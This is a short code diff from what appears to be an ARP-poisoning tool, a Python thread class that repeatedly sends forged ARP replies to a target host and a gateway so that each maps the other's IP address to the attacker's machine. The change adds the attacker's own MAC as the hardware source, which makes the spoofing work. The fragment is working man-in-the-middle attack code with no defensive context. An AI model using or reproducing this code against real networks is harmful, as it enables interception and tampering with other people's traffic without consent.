@@ -30,8 +30,8 @@ class ARPPoison(threading.Thread):
 		self.running = True
 		while self.running:
 			#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
-			net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
-			net.send(net.ARP(op="is-at", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, psrc=self.machines["target"].ip), verbose=VERBOSITY)
+			net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["this"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+			net.send(net.ARP(op="is-at", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, hwsrc=self.machines["this"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
 			time.sleep(5) #typically kept in the ARP cache for 60s
 		self.__del__()
 
